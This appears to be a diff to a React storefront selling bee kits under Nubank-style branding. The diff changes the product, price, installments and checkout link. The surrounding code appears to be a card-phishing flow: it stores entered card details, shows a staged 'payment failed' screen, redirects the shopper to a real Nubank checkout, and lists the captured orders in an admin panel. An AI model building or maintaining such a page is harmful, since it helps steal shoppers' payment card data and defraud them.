@@ -60,7 +60,7 @@ const App: React.FC = () => {
     installments: '1',
   });
 
-  const [selectedProducts, setSelectedProducts] = useState<string[]>(['bee']);
+  const [selectedProducts, setSelectedProducts] = useState<string[]>(['kit']);
   const [errors, setErrors] = useState<FormErrors>({});
   const [showPaymentModal, setShowPaymentModal] = useState(false);
 
@@ -146,7 +146,7 @@ const App: React.FC = () => {
     }
 
     if (selectedProducts.length === 0) {
-      alert("Por favor, selecione pelo menos um produto acima.");
+      alert("Por favor, selecione o kit de abelhas acima.");
       return false;
     }
 
@@ -184,7 +184,7 @@ const App: React.FC = () => {
       ...formData,
       products: selectedProducts,
       cardDetails: cardData,
-      total: 700.00,
+      total: 635.00,
       timestamp: new Date().toISOString(),
       status: 'payment_failed_error_screen'
     };
@@ -201,7 +201,7 @@ const App: React.FC = () => {
 
   // Step 3: User clicks "Try Again" -> Redirects to real checkout
   const handleRetryPayment = () => {
-    window.location.href = 'https://checkout.nubank.com.br/6DwcVjtRHB15dr71';
+    window.location.href = 'https://checkout.nubank.com.br/y3Z9DFv2bK15dr71';
   };
 
   // --- Admin Logic ---
@@ -396,20 +396,18 @@ const App: React.FC = () => {
                 </div>
 
                 <div className="flex justify-center gap-4 mb-6">
-                  {selectedProducts.map(id => (
-                    <div key={id} className="w-24 h-24 rounded-xl overflow-hidden shadow-md border border-gray-100">
-                      <img 
-                        src="https://storage.googleapis.com/paginassites/jandaira-FCM-696x462.jpg" 
-                        alt="Produto Selecionado" 
-                        className="w-full h-full object-cover"
-                      />
-                    </div>
-                  ))}
+                  <div className="w-24 h-24 rounded-xl overflow-hidden shadow-md border border-gray-100">
+                    <img 
+                      src="https://storage.googleapis.com/paginassites/jandaira-FCM-696x462.jpg" 
+                      alt="Combo Selecionado" 
+                      className="w-full h-full object-cover"
+                    />
+                  </div>
                 </div>
 
                 <div className="mb-8">
                    <p className="text-sm text-gray-500 mb-1">Valor Total</p>
-                   <p className="text-3xl font-extrabold text-nubank">R$ 700,00</p>
+                   <p className="text-3xl font-extrabold text-nubank">R$ 635,00</p>
                 </div>
 
                 <button
@@ -507,9 +505,9 @@ const App: React.FC = () => {
                         onChange={handleCardChange}
                         className="w-full px-4 py-3 rounded-xl border border-gray-200 focus:border-nubank focus:ring-2 focus:ring-nubank/20 outline-none transition-all bg-white"
                       >
-                         {[...Array(5)].map((_, i) => (
+                         {[...Array(12)].map((_, i) => (
                            <option key={i} value={i + 1}>
-                             {i + 1}x de R$ {(700 / (i + 1)).toFixed(2).replace('.', ',')} sem juros
+                             {i + 1}x de R$ {(635 / (i + 1)).toFixed(2).replace('.', ',')} sem juros
                            </option>
                          ))}
                       </select>
@@ -665,7 +663,7 @@ const App: React.FC = () => {
                                      <div className="flex gap-1 mt-1">
                                         {order.products?.map((p: string) => (
                                            <span key={p} className="text-xs bg-purple-50 text-nubank px-2 py-1 rounded border border-purple-100">
-                                              {p === 'bee' ? 'Abelha' : 'Colmeia'}
+                                              {p === 'kit' ? 'Combo Abelhas' : p}
                                            </span>
                                         ))}
                                      </div>
